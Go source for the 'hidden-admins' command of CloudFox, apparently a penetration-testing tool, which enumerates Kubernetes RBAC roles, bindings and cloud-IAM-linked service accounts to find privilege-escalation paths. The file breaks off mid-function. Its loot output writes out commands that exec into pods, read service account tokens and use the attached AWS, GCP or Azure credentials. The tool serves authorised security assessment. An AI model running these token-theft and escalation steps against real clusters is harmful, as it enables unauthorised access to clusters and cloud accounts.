package commands

import (
	"fmt"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
)

var HiddenAdminsCmd = &cobra.Command{
	Use:   "hidden-admins",
	Short: "Enumerate roles, users, groups, and service accounts with dangerous or escalatory permissions",
	Long: `
Identify hidden or dangerous administrators in a Kubernetes cluster. This includes:
  - Membership in system:masters group
  - Cluster-admin permissions
  - Ability to create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings
  - Ability to create/update Secrets or ConfigMaps
  - Impersonation rights
  - RBAC aggregation roles
  - Entities who can escalate privileges

Outputs detailed findings and attack paths:
  cloudfox kubernetes hidden-admins`,
	Run: ListHiddenAdmins,
}

type HiddenAdminFinding struct {
	Namespace      string
	Entity         string
	EntityType     string
	Scope          string
	RiskLevel      string
	DangerousPerms string
	Source         string
	CloudIAM       string // AWS/GCP/Azure IAM role
	ActivePods     int    // Number of pods using this SA
	IsDefault      bool   // Is this the default SA?
	IsWildcard     bool   // Wildcard group binding
}

type AttackPath struct {
	StartEntity string
	EntityType  string
	Steps       []string
	EndGoal     string
	RiskLevel   string
	Feasibility string // "Immediate", "Requires-Enum", "Complex"
}

type HiddenAdminsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

// Built-in dangerous roles with risk levels
var dangerousBuiltInRoles = map[string]string{
	"cluster-admin":                           shared.RiskCritical,
	"admin":                                   shared.RiskHigh,
	"edit":                                    shared.RiskMedium,
	"system:masters":                          shared.RiskCritical,
	"system:controller:deployment-controller": shared.RiskHigh,
	"system:controller:replicaset-controller": shared.RiskHigh,
	"system:controller:daemon-set-controller": shared.RiskHigh,
	"system:controller:job-controller":        shared.RiskHigh,
	"system:node":                             shared.RiskHigh,
	"system:node-proxier":                     shared.RiskMedium,
	"system:kube-controller-manager":          shared.RiskCritical,
	"system:kube-scheduler":                   shared.RiskHigh,
}

func (h HiddenAdminsOutput) TableFiles() []internal.TableFile {
	return h.Table
}

func (h HiddenAdminsOutput) LootFiles() []internal.LootFile {
	return h.Loot
}

func (h HiddenAdminFinding) ToTableRow() []string {
	cloudIAM := h.CloudIAM
	if cloudIAM == "" {
		cloudIAM = "<NONE>"
	}

	activePods := fmt.Sprintf("%d", h.ActivePods)
	if h.ActivePods == 0 && h.EntityType != "ServiceAccount" {
		activePods = "N/A"
	}

	flags := ""
	if h.IsDefault {
		flags = "DEFAULT-SA"
	}
	if h.IsWildcard {
		if flags != "" {
			flags += ", "
		}
		flags += "WILDCARD"
	}
	if flags == "" {
		flags = "-"
	}

	return []string{
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.DangerousPerms,
		cloudIAM,
		activePods,
		flags,
		h.Source,
	}
}

func (h HiddenAdminFinding) Loot() string {
	return fmt.Sprintf(
		"[Hidden Admin Detection]\nRisk Level: %s\nNamespace: %s\nEntity: %s (%s)\nScope: %s\nSource: %s\nDangerous Permissions: %s\n",
		h.RiskLevel,
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.Source,
		h.DangerousPerms,
	)
}

func ListHiddenAdmins(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating hidden admin permissions for %s", globals.ClusterName), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	headers := []string{"Namespace", "Entity", "Type", "Scope", "Dangerous Permissions", "Cloud IAM", "Active Pods", "Flags", "Source"}
	var tableRows [][]string
	var attackPaths []AttackPath

	// Risk statistics tracking
	riskCounts := shared.NewRiskCounts()

	// Loot builder
	loot := shared.NewLootBuilder()

	// Hidden Admin Attack Paths section for individual findings
	lootAdminsSection := loot.Section("Hidden-Admin-Attack-Paths")

	// Query all ServiceAccounts to detect cloud IAM annotations using cache
	serviceAccountCloudIAM := make(map[string]map[string]string) // namespace -> sa name -> cloud IAM
	serviceAccountPodCount := make(map[string]map[string]int)    // namespace -> sa name -> pod count

	logger.InfoM("Scanning ServiceAccounts for cloud IAM annotations...", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	serviceAccounts, err := sdk.GetServiceAccounts(ctx, clientset)
	if err == nil {
		for _, sa := range serviceAccounts {
			if serviceAccountCloudIAM[sa.Namespace] == nil {
				serviceAccountCloudIAM[sa.Namespace] = make(map[string]string)
			}
			if serviceAccountPodCount[sa.Namespace] == nil {
				serviceAccountPodCount[sa.Namespace] = make(map[string]int)
			}

			// Check for AWS IRSA (IAM Roles for ServiceAccounts)
			if roleARN, ok := sa.Annotations["eks.amazonaws.com/role-arn"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("AWS: %s", roleARN)
			}

			// Check for GCP Workload Identity
			if gcpSA, ok := sa.Annotations["iam.gke.io/gcp-service-account"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("GCP: %s", gcpSA)
			}

			// Check for Azure Pod Identity
			if azureID, ok := sa.Annotations["azure.workload.identity/client-id"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("Azure: %s", azureID)
			}
		}
	}

	// Count active pods per ServiceAccount using cache
	logger.InfoM("Counting active pods per ServiceAccount...", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	allPods, err := sdk.GetPods(ctx, clientset)
	if err == nil {
		for _, pod := range allPods {
			saName := pod.Spec.ServiceAccountName
			if saName == "" {
				saName = "default"
			}
			if serviceAccountPodCount[pod.Namespace] == nil {
				serviceAccountPodCount[pod.Namespace] = make(map[string]int)
			}
			serviceAccountPodCount[pod.Namespace][saName]++
		}
	}

	// ClusterRoles using cache
	clusterRoles, err := sdk.GetClusterRoles(ctx, clientset)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoles: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, role := range clusterRoles {
		var findings []string
		highestRisk := ""

		// Check if this is a built-in dangerous role
		if builtInRisk, isBuiltInDangerous := dangerousBuiltInRoles[role.Name]; isBuiltInDangerous {
			findings = append(findings, fmt.Sprintf("Built-in dangerous role: %s", role.Name))
			highestRisk = builtInRisk
		}

		if role.Name == "cluster-admin" {
			findings = append(findings, "cluster-admin role (full cluster control)")
			highestRisk = shared.RiskCritical
		}
		if strings.Contains(role.Name, "system:masters") {
			findings = append(findings, "member of system:masters group")
			highestRisk = shared.RiskCritical
		}
		if role.AggregationRule != nil && role.AggregationRule.ClusterRoleSelectors != nil && len(role.AggregationRule.ClusterRoleSelectors) > 0 {
			findings = append(findings, "RBAC Aggregation role")
		}
		if role.Rules != nil {
			for _, rule := range role.Rules {
				if k8sinternal.IsDangerousRule(rule) {
					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
					findings = append(findings, riskDesc)

					// Track highest risk level
					if highestRisk == "" || (riskLevel == shared.RiskCritical) || (riskLevel == shared.RiskHigh && highestRisk != shared.RiskCritical) {
						highestRisk = riskLevel
					}
				}
			}
		}
		if len(findings) > 0 {
			if highestRisk == "" {
				highestRisk = shared.RiskMedium
			}
			riskCounts.Add(highestRisk)
			row := HiddenAdminFinding{
				Namespace:      "<cluster>",
				Entity:         role.Name,
				EntityType:     "ClusterRole",
				Scope:          "cluster",
				RiskLevel:      highestRisk,
				DangerousPerms: strings.Join(findings, "; "),
				Source:         "ClusterRole definition",
			}
			tableRows = append(tableRows, row.ToTableRow())
			lootAdminsSection.Add(row.Loot())
		}
	}

	// ClusterRoleBindings using cache
	crbs, err := sdk.GetClusterRoleBindings(ctx, clientset)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoleBindings: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, binding := range crbs {
		if binding.Subjects != nil {
			for _, subject := range binding.Subjects {
				ns := subject.Namespace
				if ns == "" {
					ns = "<cluster>"
				}
				role := binding.RoleRef.Name
				riskLevel := ""
				isWildcard := false
				isDefault := false
				cloudIAM := ""
				activePods := 0

				// Detect wildcard group bindings
				if subject.Kind == "Group" {
					if subject.Name == "system:serviceaccounts" {
						isWildcard = true
						riskLevel = shared.RiskCritical
						// Create attack path for wildcard binding
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: "system:serviceaccounts (ALL ServiceAccounts)",
							EntityType:  "Group",
							Steps: []string{
								"ANY ServiceAccount in ANY namespace can authenticate",
								fmt.Sprintf("Bound to ClusterRole: %s", role),
								"Full cluster-wide access through group membership",
							},
							EndGoal:     "Cluster-wide privilege escalation via any ServiceAccount",
							RiskLevel:   shared.RiskCritical,
							Feasibility: "Immediate",
						})
					} else if strings.HasPrefix(subject.Name, "system:serviceaccounts:") {
						isWildcard = true
						wildcardNS := strings.TrimPrefix(subject.Name, "system:serviceaccounts:")
						riskLevel = shared.RiskHigh
						// Create attack path for namespace wildcard binding
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: fmt.Sprintf("system:serviceaccounts:%s (ALL SAs in %s)", wildcardNS, wildcardNS),
							EntityType:  "Group",
							Steps: []string{
								fmt.Sprintf("ANY ServiceAccount in namespace '%s' can authenticate", wildcardNS),
								fmt.Sprintf("Bound to ClusterRole: %s", role),
								"Namespace-wide access to cluster-level permissions",
							},
							EndGoal:     fmt.Sprintf("Privilege escalation via any ServiceAccount in %s", wildcardNS),
							RiskLevel:   shared.RiskHigh,
							Feasibility: "Immediate",
						})
					}
				}

				// Detect default ServiceAccount elevations
				if subject.Kind == "ServiceAccount" && subject.Name == "default" {
					isDefault = true
					// Escalate risk for default SA
					if riskLevel == "" || riskLevel == shared.RiskMedium {
						riskLevel = shared.RiskHigh
					} else if riskLevel == shared.RiskHigh {
						riskLevel = shared.RiskCritical
					}
					// Create attack path for default SA elevation
					attackPaths = append(attackPaths, AttackPath{
						StartEntity: fmt.Sprintf("default ServiceAccount (%s)", ns),
						EntityType:  "ServiceAccount",
						Steps: []string{
							"Default ServiceAccount has elevated permissions",
							fmt.Sprintf("Bound to ClusterRole: %s", role),
							"All pods without explicit SA use this account",
						},
						EndGoal:     "Privilege escalation through implicit ServiceAccount",
						RiskLevel:   riskLevel,
						Feasibility: "Immediate",
					})
				}

				// Get cloud IAM and pod count for ServiceAccounts
				if subject.Kind == "ServiceAccount" && ns != "<cluster>" {
					if saCloudIAM, ok := serviceAccountCloudIAM[ns][subject.Name]; ok {
						cloudIAM = saCloudIAM
						// Create attack path for cloud IAM crosswalk
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: fmt.Sprintf("%s/%s", ns, subject.Name),
							EntityType:  "ServiceAccount",
							Steps: []string{
								fmt.Sprintf("K8s: Bound to ClusterRole %s", role),
								fmt.Sprintf("Cloud: %s", cloudIAM),
								"Compromise pod → K8s cluster access + Cloud IAM access",
							},
							EndGoal:     "Multi-cloud privilege escalation (K8s + Cloud Provider)",
							RiskLevel:   shared.RiskCritical,
							Feasibility: "Requires-Enum",
						})
					}
					if podCount, ok := serviceAccountPodCount[ns][subject.Name]; ok {
						activePods = podCount
					}
				}

				// Check built-in dangerous roles
				if builtInRisk, isDangerous := dangerousBuiltInRoles[role]; isDangerous {
					if riskLevel == "" || (builtInRisk == shared.RiskCritical) || (builtInRisk == shared.RiskHigh && riskLevel != shared.RiskCritical) {
						riskLevel = builtInRisk
					}
				}

				if role == "cluster-admin" || role == "system:masters" {
					riskLevel = shared.RiskCritical
				} else if role == "admin" || role == "edit" {
					if riskLevel == "" {
						riskLevel = shared.RiskHigh
					}
				}

				if riskLevel != "" {
					riskCounts.Add(riskLevel)
					row := HiddenAdminFinding{
						Namespace:      ns,
						Entity:         subject.Name,
						EntityType:     subject.Kind,
						Scope:          "cluster",
						RiskLevel:      riskLevel,
						DangerousPerms: fmt.Sprintf("bound to ClusterRole %s", role),
						Source:         fmt.Sprintf("ClusterRoleBinding %s", binding.Name),
						CloudIAM:       cloudIAM,
						ActivePods:     activePods,
						IsDefault:      isDefault,
						IsWildcard:     isWildcard,
					}
					tableRows = append(tableRows, row.ToTableRow())
					lootAdminsSection.Add(row.Loot())
				}
			}
		}
	}

	// Roles & RoleBindings using cache
	allRoles, err := sdk.GetRoles(ctx, clientset)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching Roles: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	}

	allRoleBindings, err := sdk.GetRoleBindings(ctx, clientset)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching RoleBindings: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	}

	// Process roles grouped by namespace
	dangerousRolesInNS := make(map[string]map[string][]string) // namespace -> roleName -> []findings
	for _, role := range allRoles {
		ns := role.Namespace
		if dangerousRolesInNS[ns] == nil {
			dangerousRolesInNS[ns] = make(map[string][]string)
		}

		var findings []string
		highestRisk := ""

		if role.Rules != nil {
			for _, rule := range role.Rules {
				if k8sinternal.IsDangerousRule(rule) {
					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
					findings = append(findings, riskDesc)

					// Track highest risk level
					if highestRisk == "" || (riskLevel == shared.RiskCritical) || (riskLevel == shared.RiskHigh && highestRisk != shared.RiskCritical) || (riskLevel == shared.RiskMedium && highestRisk != shared.RiskCritical && highestRisk != shared.RiskHigh) {
						highestRisk = riskLevel
					}
				}
			}
		}
		if len(findings) > 0 {
			if highestRisk == "" {
				highestRisk = shared.RiskMedium
			}
			riskCounts.Add(highestRisk)
			dangerousRolesInNS[ns][role.Name] = findings
			row := HiddenAdminFinding{
				Namespace:      ns,
				Entity:         role.Name,
				EntityType:     "Role",
				Scope:          "namespace",
				RiskLevel:      highestRisk,
				DangerousPerms: strings.Join(findings, "; "),
				Source:         fmt.Sprintf("Role definition (%s)", role.Name),
			}
			tableRows = append(tableRows, row.ToTableRow())
			lootAdminsSection.Add(row.Loot())
		}
	}

	// Process RoleBindings
	for _, binding := range allRoleBindings {
		ns := binding.Namespace
		if binding.Subjects != nil {
			// Check if the role being bound is dangerous
			roleName := binding.RoleRef.Name
			var isDangerousBinding bool
			var bindingPerms string
			var riskLevel string

			// Check if it's a dangerous namespaced role
			if dangerousRolesInNS[ns] != nil {
				if findings, ok := dangerousRolesInNS[ns][roleName]; ok {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to Role %s with: %s", roleName, strings.Join(findings, "; "))
					riskLevel = shared.RiskHigh
				}
			}

			// Check if it's binding to a ClusterRole (which might be cluster-admin or other dangerous ClusterRole)
			if binding.RoleRef.Kind == "ClusterRole" {
				if roleName == "cluster-admin" || strings.Contains(roleName, "system:masters") {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
					riskLevel = shared.RiskCritical
				} else if roleName == "admin" {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
					riskLevel = shared.RiskHigh
				} else if roleName == "edit" {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
					riskLevel = shared.RiskMedium
				}
			}

			// Only add subjects if this is a dangerous binding
			if isDangerousBinding {
				if riskLevel == "" {
					riskLevel = shared.RiskMedium
				}
				for _, subject := range binding.Subjects {
					cloudIAM := ""
					activePods := 0
					isDefault := false

					// Detect default ServiceAccount in namespace bindings
					if subject.Kind == "ServiceAccount" && subject.Name == "default" {
						isDefault = true
						// Escalate risk for default SA
						if riskLevel == shared.RiskMedium {
							riskLevel = shared.RiskHigh
						} else if riskLevel == shared.RiskHigh {
							riskLevel = shared.RiskCritical
						}
					}

					// Get cloud IAM and pod count for ServiceAccounts
					if subject.Kind == "ServiceAccount" {
						if saCloudIAM, ok := serviceAccountCloudIAM[ns][subject.Name]; ok {
							cloudIAM = saCloudIAM
						}
						if podCount, ok := serviceAccountPodCount[ns][subject.Name]; ok {
							activePods = podCount
						}
					}

					riskCounts.Add(riskLevel)
					row := HiddenAdminFinding{
						Namespace:      ns,
						Entity:         subject.Name,
						EntityType:     subject.Kind,
						Scope:          "namespace",
						RiskLevel:      riskLevel,
						DangerousPerms: bindingPerms,
						Source:         fmt.Sprintf("RoleBinding %s", binding.Name),
						CloudIAM:       cloudIAM,
						ActivePods:     activePods,
						IsDefault:      isDefault,
						IsWildcard:     false,
					}
					tableRows = append(tableRows, row.ToTableRow())
					lootAdminsSection.Add(row.Loot())
				}
			}
		}
	}

	// Cross-reference ServiceAccounts with running pods
	lootSAPodsSection := loot.Section("ServiceAccount-Pod-Mapping").SetHeader(`#####################################
##### ServiceAccount to Pod Mapping
#####################################
#
# Which pods are running with dangerous ServiceAccounts
# This helps identify active attack vectors
#`)

	if globals.KubeContext != "" {
		lootSAPodsSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

	// Build a map of dangerous service accounts
	dangerousSAs := make(map[string]map[string]string) // namespace -> sa -> risk level
	for _, row := range tableRows {
		// Extract namespace, entity, type, and risk level from table rows
		if len(row) >= 5 {
			ns := row[0]
			entity := row[1]
			entityType := row[2]
			riskLevel := row[4]

			if entityType == "ServiceAccount" {
				if dangerousSAs[ns] == nil {
					dangerousSAs[ns] = make(map[string]string)
				}
				dangerousSAs[ns][entity] = riskLevel
			}
		}
	}

	// Query pods to find which ones use these dangerous SAs (using already cached pods)
	hasPodsWithDangerousSA := false
	if len(dangerousSAs) > 0 {
		for _, pod := range allPods {
			ns := pod.Namespace
			if _, exists := dangerousSAs[ns]; !exists {
				continue // Skip pods in namespaces without dangerous SAs
			}

			saName := pod.Spec.ServiceAccountName
			if saName == "" {
				saName = "default"
			}

			if riskLevel, found := dangerousSAs[ns][saName]; found {
				hasPodsWithDangerousSA = true
				lootSAPodsSection.AddBlank()
				lootSAPodsSection.Addf("# [%s] Pod: %s/%s uses dangerous ServiceAccount: %s", riskLevel, ns, pod.Name, saName)
				lootSAPodsSection.Addf("# Node: %s, Status: %s", pod.Spec.NodeName, pod.Status.Phase)
				lootSAPodsSection.Addf("kubectl exec -it %s -n %s -- /bin/sh", pod.Name, ns)
				lootSAPodsSection.Add("# Inside pod, extract SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token")
			}
		}

		if !hasPodsWithDangerousSA {
			lootSAPodsSection.AddBlank()
			lootSAPodsSection.Add("# No running pods found using dangerous ServiceAccounts")
			lootSAPodsSection.Add("# This is good - dangerous SAs exist but aren't actively in use")
		}
	} else {
		lootSAPodsSection.AddBlank()
		lootSAPodsSection.Add("# No dangerous ServiceAccounts detected in findings")
	}

	// Build Attack Path Chains loot file
	lootAttackPathsSection := loot.Section("Attack-Path-Chains").SetHeader(`#####################################
##### Attack Path Chain Analysis
#####################################
#
# Multi-step privilege escalation paths
# Visualizes how attackers can chain permissions
#`)

	if len(attackPaths) > 0 {
		for i, path := range attackPaths {
			lootAttackPathsSection.AddBlank()
			lootAttackPathsSection.Addf("## Attack Path #%d [%s - %s]", i+1, path.RiskLevel, path.Feasibility)
			lootAttackPathsSection.Addf("Start: %s (%s)", path.StartEntity, path.EntityType)
			lootAttackPathsSection.AddBlank()
			lootAttackPathsSection.Add("Steps:")
			for stepNum, step := range path.Steps {
				lootAttackPathsSection.Addf("  %d. %s", stepNum+1, step)
			}
			lootAttackPathsSection.AddBlank()
			lootAttackPathsSection.Addf("End Goal: %s", path.EndGoal)
			lootAttackPathsSection.AddBlank()
			lootAttackPathsSection.Add("---")
		}
	} else {
		lootAttackPathsSection.AddBlank()
		lootAttackPathsSection.Add("# No attack paths detected")
	}

	// Build Cloud IAM Crosswalk loot file
	lootCloudIAMSection := loot.Section("Cloud-IAM-Crosswalk").SetHeader(`#####################################
##### Cloud IAM Crosswalk Analysis
#####################################
#
# Kubernetes ServiceAccounts with Cloud IAM roles
# Compromising these SAs gives BOTH K8s and Cloud access
#`)

	if globals.KubeContext != "" {
		lootCloudIAMSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

	hasCloudIAM := false
	for ns, saMap := range serviceAccountCloudIAM {
		for saName, cloudRole := range saMap {
			hasCloudIAM = true
			podCount := 0
			if serviceAccountPodCount[ns] != nil {
				podCount = serviceAccountPodCount[ns][saName]
			}

			lootCloudIAMSection.AddBlank()
			lootCloudIAMSection.Addf("## ServiceAccount: %s/%s", ns, saName)
			lootCloudIAMSection.Addf("Cloud IAM: %s", cloudRole)
			lootCloudIAMSection.Addf("Active Pods: %d", podCount)
			lootCloudIAMSection.AddBlank()
			lootCloudIAMSection.Add("# Exploitation:")
			lootCloudIAMSection.Addf("kubectl get pods -n %s -o json | jq '.items[] | select(.spec.serviceAccountName==\"%s\") | .metadata.name'", ns, saName)
			lootCloudIAMSection.Addf("kubectl exec -it <pod-name> -n %s -- /bin/sh", ns)
			lootCloudIAMSection.Add("# Inside pod:")
			lootCloudIAMSection.Add("cat /var/run/secrets/kubernetes.io/serviceaccount/token")

			if strings.HasPrefix(cloudRole, "AWS:") {
				lootCloudIAMSection.Add("# For AWS IRSA:")
				lootCloudIAMSection.Add("aws sts get-caller-identity")
				lootCloudIAMSection.Add("aws s3 ls")
			} else if strings.HasPrefix(cloudRole, "GCP:") {
				lootCloudIAMSection.Add("# For GCP Workload Identity:")
				lootCloudIAMSection.Add("gcloud auth list")
				lootCloudIAMSection.Add("gcloud projects list")
			} else if strings.HasPrefix(cloudRole, "Azure:") {
				lootCloudIAMSection.Add("# For Azure Pod Identity:")
				lootCloudIAMSection.Add("az account show")
				lootCloudIAMSection.Add("az resource list")
			}
		}
	}

	if !hasCloudIAM {
		lootCloudIAMSection.AddBlank()
		lootCloudIAMSection.Add("# No ServiceAccounts with cloud IAM annotations detected")
		lootCloudIAMSection.Add("# This is good - no K8s-to-Cloud privilege escalation paths")
	}

	// Build Risk Dashboard loot file
	lootRiskDashboardSection := loot.Section("Risk-Dashboard").SetHeader(`#####################################
##### Risk Statistics Dashboard
#####################################
#
# Summary of dangerous permissions by risk level
#`)

	totalFindings := riskCounts.Total()
	lootRiskDashboardSection.AddBlank()
	lootRiskDashboardSection.Add("## Overall Statistics")
	lootRiskDashboardSection.Addf("Total Findings: %d", totalFindings)
	lootRiskDashboardSection.Addf("CRITICAL Risk: %d", riskCounts.Critical)
	lootRiskDashboardSection.Addf("HIGH Risk:     %d", riskCounts.High)
	lootRiskDashboardSection.Addf("MEDIUM Risk:   %d", riskCounts.Medium)
	lootRiskDashboardSection.Addf("LOW Risk:      %d", riskCounts.Low)

	lootRiskDashboardSection.AddBlank()
	lootRiskDashboardSection.Add("## Attack Paths")
	lootRiskDashboardSection.Addf("Total Attack Paths Identified: %d", len(attackPaths))

	criticalPaths := 0
	highPaths := 0
	immediatePaths := 0
	for _, path := range attackPaths {
		if path.RiskLevel == shared.RiskCritical {
			criticalPaths++
		} else if path.RiskLevel == shared.RiskHigh {
			highPaths++
		}
		if path.Feasibility == "Immediate" {
			immediatePaths++
		}
	}
	lootRiskDashboardSection.Addf("  CRITICAL: %d", criticalPaths)
	lootRiskDashboardSection.Addf("  HIGH: %d", highPaths)
	lootRiskDashboardSection.Addf("  Immediate Exploitation: %d", immediatePaths)

	lootRiskDashboardSection.AddBlank()
	lootRiskDashboardSection.Add("## Cloud IAM Integration")
	cloudIAMCount := 0
	for _, saMap := range serviceAccountCloudIAM {
		cloudIAMCount += len(saMap)
	}
	lootRiskDashboardSection.Addf("ServiceAccounts with Cloud IAM: %d", cloudIAMCount)

	defaultSACount := 0
	wildcardCount := 0
	for _, row := range tableRows {
		if len(row) >= 9 {
			flags := row[8]
			if strings.Contains(flags, "DEFAULT-SA") {
				defaultSACount++
			}
			if strings.Contains(flags, "WILDCARD") {
				wildcardCount++
			}
		}
	}
	lootRiskDashboardSection.AddBlank()
	lootRiskDashboardSection.Add("## Critical Misconfigurations")
	lootRiskDashboardSection.Addf("Default ServiceAccounts with Elevated Permissions: %d", defaultSACount)
	lootRiskDashboardSection.Addf("Wildcard ServiceAccount Group Bindings: %d", wildcardCount)

	lootRiskDashboardSection.AddBlank()
	lootRiskDashboardSection.Add("## Recommendations")
	if riskCounts.Critical > 0 {
		lootRiskDashboardSection.Addf("⚠️  URGENT: %d CRITICAL findings require immediate remediation", riskCounts.Critical)
	}
	if wildcardCount > 0 {
		lootRiskDashboardSection.Addf("⚠️  URGENT: %d wildcard bindings grant excessive permissions", wildcardCount)
	}
	if defaultSACount > 0 {
		lootRiskDashboardSection.Addf("⚠️  WARNING: %d default ServiceAccounts have elevated permissions", defaultSACount)
	}
	if cloudIAMCount > 0 {
		lootRiskDashboardSection.Addf("ℹ️  INFO: %d ServiceAccounts have cloud IAM roles - ensure least privilege", cloudIAMCount)
	}

	lootEnumSection := loot.Section("Dangerous-Permissions-Enum").SetHeader(`#####################################
##### Enumerate Dangerous Permissions
#####################################
`)

	if globals.KubeContext != "" {
		lootEnumSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

	lootEnumSection.Add(`
# Check for system:masters membership
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:masters")'
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name=="system:masters")'

# Find impersonation rules
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | .verbs[]? | ascii_downcase == "impersonate")'
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]?=="impersonate") | .metadata.name, .rules[]? | select(.verbs[]?=="impersonate")'

# Find Role/ClusterRole creation permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create") and (.resources[]? | ascii_downcase | contains("role") ))'

# Find ConfigMap and Secret modification permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create" or ascii_downcase == "update") and (.resources[]? | ascii_downcase | contains("secret") or contains("configmap") ))'

# Check who can bind cluster-admin
kubectl get clusterroles -o json | jq '.items[] | select(.metadata.name == "cluster-admin")'

# Find cluster-admin bindings (Any subject (User, Group, ServiceAccount) bound to the cluster-admin role.)
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name, .subjects[]? | "\(.kind):\(.name) (ns=\(.namespace // "cluster-scope"))"'

# Roles that can escalate privileges via RBAC editing
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|clusterroles|rolebindings|clusterrolebindings"))) | .metadata.name, .rules[]'

# Create/modify secrets
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="secrets") and (.verbs[]? | test("create|update|patch|get"))) | .metadata.name'

# Create/modify configmaps
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="configmaps") and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Wildcard permissions - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name'

# Pod execution permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("pods/exec|pods/attach|pods/portforward")) and (.verbs[]? | test("create|get"))) | .metadata.name'

# Admission webhook control - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("validatingwebhookconfigurations|mutatingwebhookconfigurations")) and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Certificate approval - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("certificatesigningrequests")) and (.verbs[]? | test("create|update|approve"))) | .metadata.name'

# Node modification - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("nodes")) and (.verbs[]? | test("create|update|patch|delete"))) | .metadata.name'

# Namespace-Scoped Permissions

# Namespace-level cluster-admin equivalents
kubectl get rolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name=="admin" or .roleRef.name=="cluster-admin") | "\(.metadata.namespace): \(.roleRef.name) -> \(.subjects[]?.kind):\(.subjects[]?.name)"'

# Namespace-scoped RBAC modification
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|rolebindings")) and (.verbs[]? | test("create|update|patch"))) | "\(.metadata.namespace): \(.metadata.name)"'

# Namespace impersonation
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]?=="impersonate")) | "\(.metadata.namespace): \(.metadata.name)"'

# Create Pods with elevated privileges
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="pods") and (.verbs[]? | test("create"))) | "\(.metadata.namespace): \(.metadata.name)"'

`)

	// Build exploitation techniques loot file
	lootExploitsSection := loot.Section("Privilege-Escalation-Techniques").SetHeader(`#####################################
##### Privilege Escalation Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Actionable exploitation techniques for discovered permissions
#`)

	if globals.KubeContext != "" {
		lootExploitsSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

